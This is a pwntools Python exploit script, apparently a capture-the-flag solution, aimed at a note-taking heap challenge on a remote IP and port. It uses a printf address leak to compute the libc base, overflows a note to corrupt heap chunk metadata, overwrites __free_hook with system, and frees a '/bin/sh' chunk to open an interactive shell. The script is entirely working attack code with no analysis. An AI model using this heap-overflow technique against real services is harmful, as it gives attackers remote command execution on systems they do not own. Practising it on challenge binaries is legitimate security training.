from pwn import *

#p = process('./chall')
p = remote('34.252.33.37', 31930)

libc = ELF('./libc.so.6')
def create_note(content):
    p.sendlineafter(b": ", b"1")
    p.sendlineafter(b"Enter the note content: ", content)
    log.info("Created a note.")

def modify_note(index, content):
    p.sendlineafter(b": ", b"3")
    p.sendlineafter(b"Enter the note index (0-9): ", str(index).encode())
    p.sendlineafter(b"Enter the new content: ", content)
    log.info(f"Modified note {index}.")

def delete_note(index):
    p.sendlineafter(b": ", b"4")
    p.sendlineafter(b"Enter the note index (0-9): ", str(index).encode())
    log.info(f"Deleted note {index}.")

def leak_printf():
    p.sendlineafter(b": ", b"6")
    p.recvuntil(b"maybe u will need this: ")
    leaked_addr = int(p.recvline().strip(), 16)
    log.success(f"Leaked printf address: {hex(leaked_addr)}")
    return leaked_addr

log.info("Step 1: Leaking libc address...")
leaked_printf = leak_printf()
libc.address = leaked_printf - libc.symbols['printf']
log.success(f"Calculated libc base address: {hex(libc.address)}")

free_hook_addr = libc.symbols['__free_hook']
system_addr = libc.symbols['system']

create_note(b"A"*8)
create_note(b"B"*8)
delete_note(1)
payload = flat(b'A' * 0x80, p64(0) + p64(0x21), b'B' * 0x10, p64(0) + p64(0x91), p64(free_hook_addr))
modify_note(0, payload)
create_note(b"dummy")
create_note(p64(system_addr))
create_note(b"/bin/sh\x00")
delete_note(3)
p.interactive()